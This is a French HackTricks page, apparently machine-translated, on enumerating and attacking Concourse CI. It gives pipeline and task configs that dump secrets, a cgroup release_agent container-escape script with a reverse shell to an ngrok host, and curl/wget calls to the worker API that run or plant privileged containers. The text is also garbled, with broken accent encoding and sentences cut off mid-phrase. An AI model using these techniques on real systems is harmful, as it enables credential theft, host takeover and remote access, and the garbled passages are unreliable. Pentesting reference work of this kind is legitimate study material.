# √ânum√©ration et attaques Concourse

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts Github.**

</details>

## R√¥les et autorisations d'utilisateur

Concourse est livr√© avec cinq r√¥les :

* _Concourse_ **Admin** : Ce r√¥le est uniquement donn√© aux propri√©taires de l'**√©quipe principale** (√©quipe initiale par d√©faut de Concourse). Les administrateurs peuvent **configurer d'autres √©quipes** (par exemple : `fly set-team`, `fly destroy-team`...). Les autorisations de ce r√¥le ne peuvent pas √™tre affect√©es par RBAC.
* **propri√©taire** : Les propri√©taires d'√©quipe peuvent **modifier tout ce qui se trouve dans l'√©quipe**.
* **membre** : Les membres de l'√©quipe peuvent **lire et √©crire** dans les **ressources de l'√©quipe** mais ne peuvent pas modifier les param√®tres de l'√©quipe.
* **op√©rateur de pipeline** : Les op√©rateurs de pipeline peuvent effectuer des **op√©rations de pipeline** telles que le d√©clenchement de builds et la mise en pin des ressources, mais ils ne peuvent pas mettre √† jour les configurations de pipeline.
* **spectateur** : Les spectateurs de l'√©quipe ont un acc√®s **"lecture seule" √† une √©quipe** et √† ses pipelines.

{% hint style="info" %}
De plus, les **autorisations des r√¥les propri√©taire, membre, op√©rateur de pipeline et spectateur peuvent √™tre modifi√©es** en configurant RBAC (en configurant plus pr√©cis√©ment ses actions). En savoir plus √† ce sujet dans : [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Notez que Concourse **groupe les pipelines √† l'int√©rieur des √©quipes**. Par cons√©quent, les utilisateurs appartenant √† une √©quipe seront en mesure de g√©rer ces pipelines et **plusieurs √©quipes** peuvent exister. Un utilisateur peut appartenir √† plusieurs √©quipes et avoir des autorisations diff√©rentes dans chacune d'entre elles.

## Vars & Gestionnaire de cr√©dentials

Dans les configurations YAML, vous pouvez configurer des valeurs en utilisant la syntaxe `((`_`nom-source`_`:`_`chemin-secret`_`.`_`champ-secret`_`))`.\
Le **nom de la source est facultatif**, et s'il est omis, le [gestionnaire de cr√©dentials √† l'√©chelle du cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) sera utilis√©, ou la valeur peut √™tre fournie [statiquement](https://concourse-ci.org/vars.html#static-vars).\
Le champ secret facultatif **_secret-field_** sp√©cifie un champ sur le secret r√©cup√©r√© √† lire. S'il est omis, le gestionnaire de cr√©dentials peut choisir de lire un 'champ par d√©faut' du cr√©dential r√©cup√©r√© si le champ existe.\
De plus, le _**secret-path**_ et le _**secret-field**_ peuvent √™tre entour√©s de guillemets doubles `"..."` s'ils **contiennent des caract√®res sp√©ciaux** comme `.` et `:`. Par exemple, `((source:"my.secret"."field:1"))` d√©finira le _secret-path_ sur `my.secret` et le _secret-field_ sur `field:1`.

### Vars statiques

Les vars statiques peuvent √™tre sp√©cifi√©es dans les **√©tapes des t√¢ches** :

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Ou en utilisant les **arguments** `fly` suivants :

* `-v` ou `--var` `NOM=VALEUR` d√©finit la cha√Æne `VALEUR` comme valeur pour la variable `NOM`.
* `-y` ou `--yaml-var` `NOM=VALEUR` analyse `VALEUR` en tant que YAML et la d√©finit comme valeur pour la variable `NOM`.
* `-i` ou `--instance-var` `NOM=VALEUR` analyse `VALEUR` en tant que YAML et la d√©finit comme valeur pour la variable d'instance `NOM`. Voir [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) pour en savoir plus sur les variables d'instance.
* `-l` ou `--load-vars-from` `FICHIER` charge `FICHIER`, un document YAML contenant des noms de variables de mappage et des valeurs, et les d√©finit tous.

### Gestion des cr√©dentials

Il existe diff√©rentes fa√ßons de sp√©cifier un **gestionnaire de cr√©dentials** dans un pipeline, lisez comment dans [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
De plus, Concourse prend en charge diff√©rents gestionnaires de cr√©dentials :

* [Le gestionnaire de cr√©dentials Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Le gestionnaire de cr√©dentials CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Le gestionnaire de cr√©dentials AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Le gestionnaire de cr√©dentials AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Gestionnaire de cr√©dentials Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Le gestionnaire de cr√©dentials Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Mise en cache des cr√©dentials](https://concourse-ci.org/creds-caching.html)
* [Masquage des cr√©dentials](https://concourse-ci.org/creds-redacting.html)
* [R√©essayer les r√©cup√©rations √©chou√©es](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Notez que si vous avez une sorte d'**acc√®s en √©criture √† Concourse**, vous pouvez cr√©er des jobs pour **exfiltrer ces secrets** car Concourse doit √™tre capable d'y acc√©der.
{% endhint %}

## √ânum√©ration Concourse

Pour √©num√©rer un environnement Concourse, vous devez d'abord **rassembler des identifiants valides** ou trouver un **
### Cr√©ation/Modification de pipeline

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **cr√©er/modifier de nouveaux pipelines**. V√©rifiez cet exemple :

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Indique √† Concourse sur quel type de worker cette t√¢che doit √™tre ex√©cut√©e
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # les images sont extraites de Docker Hub par d√©faut
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

Avec la **modification/cr√©ation** d'un nouveau pipeline, vous pourrez :

* **Vol**er les **secrets** (en les √©choant ou en entrant dans le conteneur et en ex√©cutant `env`)
* **S'√©chapper** vers le **n≈ìud** (en vous donnant suffisamment de privil√®ges - `privileged: true`)
* √ânum√©rer/Abuser de l'endpoint **m√©tadonn√©es cloud** (du pod et du n≈ìud)
* **Supprimer** le pipeline cr√©√©

### Ex√©cution de t√¢ches personnalis√©es

Ceci est similaire √† la m√©thode pr√©c√©dente, mais au lieu de modifier/cr√©er un nouveau pipeline, vous pouvez **simplement ex√©cuter une t√¢che personnalis√©e** (qui sera probablement beaucoup plus **furtive**) :

```yaml
# Pour plus d'options de task_config, consultez https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### √âchapper au n≈ìud √† partir d'une t√¢che privil√©gi√©e

Dans les sections pr√©c√©dentes, nous avons vu comment **ex√©cuter une t√¢che privil√©gi√©e avec Concourse**. Cela ne donnera pas exactement au conteneur le m√™me acc√®s que le drapeau privil√©gi√© dans un conteneur Docker. Par exemple, vous ne verrez pas le p√©riph√©rique de syst√®me de fichiers du n≈ìud dans /dev, donc l'√©vasion pourrait √™tre plus "complexe".

Dans le PoC suivant, nous allons utiliser le release\_agent pour nous √©chapper avec quelques petites modifications :

```bash
# Montez le contr√¥leur de groupe cgroup RDMA et cr√©ez un sous-groupe
# Si vous suivez et obtenez "mount: /tmp/cgrp: special device cgroup does not exist"
# C'est parce que votre configuration n'a pas le contr√¥leur de groupe de m√©moire cgroup, essayez de changer memory en rdma pour le corriger
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Active les notifications cgroup lors de la lib√©ration du sous-groupe "x"
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# Le chemin d'h√¥te ressemblera √† ce qui suit, mais vous devez le changer :
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## Le chemin initial "/mnt/vda1" est probablement le m√™me, mais vous pouvez le v√©rifier en utilisant la commande mount :
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## La partie suivante je pense est constante "hostpath-provisioner/default/"

## Pour la partie suivante "concourse-work-dir-concourse-release-worker-0", vous devez savoir comment elle est construite
# "concourse-work-dir" est constant
# "concourse-release" est le pr√©fixe de Concourse de l'environnement Concourse actuel (vous devez le trouver √† partir de l'API)
# "worker-0" est le nom du worker dans lequel le conteneur s'ex√©cute (sera g√©n√©ralement celui-ci ou incr√©mentant le nombre)

## La derni√®re partie "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" est un peu constante
# en ex√©cutant `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` vous verrez quelque chose comme :
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# l'UID est la partie que nous cherchons

# Ensuite, le chemin d'h√¥te est :
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# D√©finit release_agent sur /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Shell invers√©
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Obtenir la sortie
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Ex√©cute l'attaque en lan√ßant un processus qui se termine imm√©diatement dans le sous-groupe "x"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Lit la sortie
cat /output
```

{% hint style="warning" %}
Comme vous l'avez peut-√™tre remarqu√©, il s'agit simplement d'une [**√©vasion r√©guli√®re de release\_agent
#### Acc√©der √† l'int√©rieur d'un conteneur privil√©gi√© en cours d'ex√©cution

```bash
# Obtenir le conteneur actuel
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Obtenir les informations du conteneur
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Ex√©cuter un nouveau processus √† l'int√©rieur d'un conteneur
## Dans ce cas, "sleep 20000" sera ex√©cut√© dans le conteneur avec le gestionnaire ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# OU au lieu de faire tout cela, vous pouvez simplement entrer dans le ns du processus du conteneur privil√©gi√©
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Cr√©ation d'un nouveau conteneur privil√©gi√©

Vous pouvez tr√®s facilement cr√©er un nouveau conteneur (en ex√©cutant simplement un UID al√©atoire) et ex√©cuter quelque chose dessus :

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget sera bloqu√© tant que le processus est en cours d'ex√©cution
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

Cependant, le serveur web v√©rifie toutes les quelques secondes les conteneurs en cours d'ex√©cution, et s'il en d√©couvre un inattendu, il sera supprim√©. Comme la communication se fait en HTTP, vous pouvez alt√©rer la communication pour √©viter la suppression des conteneurs inattendus :

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>